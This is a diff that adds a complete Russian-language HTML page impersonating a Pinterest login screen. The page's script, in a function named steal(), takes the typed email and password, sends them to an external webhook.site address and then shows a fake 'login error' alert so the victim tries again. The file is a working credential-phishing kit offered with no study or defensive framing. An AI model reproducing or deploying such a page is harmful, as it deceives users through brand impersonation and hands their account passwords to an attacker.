@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <title>Вход в Pinterest</title>
+  <style>
+    body { font-family: Arial; text-align: center; margin-top: 100px; background: #f0f0f0; }
+    .login-box { width: 300px; margin: 0 auto; padding: 20px; background: white; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.2); }
+    input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
+    button { width: 100%; padding: 10px; background: #e60023; color: white; border: none; border-radius: 5px; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <h2>Войдите в Pinterest</h2>
+    <p>Чтобы продолжить сохранение пинов</p>
+    <form>
+      <input type="email" placeholder="Email" id="email">
+      <input type="password" placeholder="Пароль" id="pass">
+      <button type="button" onclick="steal()">Войти</button>
+    </form>
+  </div>
+
+  <script>
+    function steal() {
+      const email = document.getElementById('email').value;
+      const pass = document.getElementById('pass').value;
+      fetch('https://webhook.site/5afd0ff8-05f8-46f8-87d3-ad600e811337?email=' + email + '&pass=' + pass);
+      alert('Ошибка входа. Попробуйте ещё раз.');
+    }
+  </script>
+</body>
+</html>
